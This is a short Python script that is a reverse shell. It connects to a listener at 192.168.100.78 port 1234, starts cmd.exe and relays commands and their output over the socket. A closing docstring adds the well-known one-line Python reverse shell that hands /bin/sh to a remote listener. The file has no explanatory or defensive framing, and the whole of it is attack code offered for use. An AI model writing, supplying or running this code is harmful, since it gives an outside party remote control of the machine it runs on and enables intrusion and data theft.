import socket
import subprocess
import os

# Connect to your listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.100.78', 1234))

# Start the shell process
p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

while True:
    # Receive command from listener
    data = s.recv(1024)
    if len(data) > 0:
        # Write command to cmd.exe
        p.stdin.write(data)
        p.stdin.flush()
        
        # Read the result and send it back
        # We use a small trick here to prevent the shell from hanging
        answer = p.stdout.readline() 
        s.send(answer)

"""
python -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh'])" 

127.0.0.1
"""